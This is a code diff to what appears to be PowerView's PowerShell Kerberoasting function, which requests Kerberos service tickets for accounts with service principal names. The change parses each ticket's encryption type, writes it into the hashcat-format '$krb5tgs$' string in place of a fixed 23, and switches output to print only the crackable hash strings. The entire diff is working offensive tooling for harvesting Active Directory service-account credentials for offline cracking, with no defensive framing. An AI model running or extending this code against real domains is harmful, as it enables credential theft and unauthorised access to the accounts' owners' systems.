@@ -562,6 +562,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
             }
             if ($TicketByteStream) {
                 $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
+                $encType =  [Convert]::ToInt32(($TicketHexStream -replace ".*A0030201")[0..1] -join "", 16)
                 [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
                 $Parts.RemoveAt($Parts.Count - 1)
                 $Hash = $Parts -join 'A48201'
@@ -582,13 +583,17 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                     else {
                         $UserDomain = 'UNKNOWN'
                     }
-
                     # hashcat output format
-                    $HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
+                    $HashFormat = "`$krb5tgs`$$encType`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
+                   
                 }
                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
-                Write-Output $Out
+                #Prints the PS Object
+                #Write-Output $Out
+ 
+                #Prints just the hashes
+                Write-Output $HashFormat
             }
         }
     }
